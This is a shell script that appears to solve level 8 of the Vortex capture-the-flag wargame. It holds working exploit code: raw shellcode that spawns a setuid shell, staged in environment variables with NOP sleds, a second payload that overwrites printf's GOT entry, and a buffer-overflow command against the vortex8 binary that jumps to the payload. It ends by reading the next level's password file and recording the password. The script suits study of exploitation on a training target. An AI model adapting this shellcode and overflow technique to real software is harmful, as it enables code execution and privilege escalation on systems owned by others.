# !/bin/sh
# We have to overwrite the address of printf

mkdir /tmp/ballban_vortex8
cd /tmp/ballban_vortex8

# Set env
export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 100 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
# Address of EGG1
export EGG2=$(python3 -c "import sys; import struct; sys.stdout.buffer.write(b'\xff' * 114)")

# Create check_env.c and compile
nano check_env.c
gcc -m32 check_env.c -o check_env

# Check address of EGG
./check_env EGG

# Code to overwrite address of printf
nano pwn.asm
nasm -f elf pwn.asm
ld -m elf_i386 -s -o pwn pwn.o
objdump -d -M intel pwn
# Change the code to bytes

# Put the code in EGG2
# We add \xeb\xfe in behind to create a self-loop because if the main thread dies, then the program will terminate, and we cannot get the shell from the child process. https://thestarman.pcministry.com/asm/2bytejumps.htm
export EGG2=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 100 + b'\xb9\x04\xc0\x04\x08\xbbw\xdd\xff\xff\x89\x19' + b'\xeb\xfe')")

# Check address of EGG
./check_env EGG2

/vortex/vortex8 $(python3 -c "import sys; import struct; sys.stdout.buffer.write(b'A' * 1032 + b'B' * 4 + struct.pack('<I', 0xffffdc86))")

cat /etc/vortex_pass/vortex9
# password: hCuwrgfqn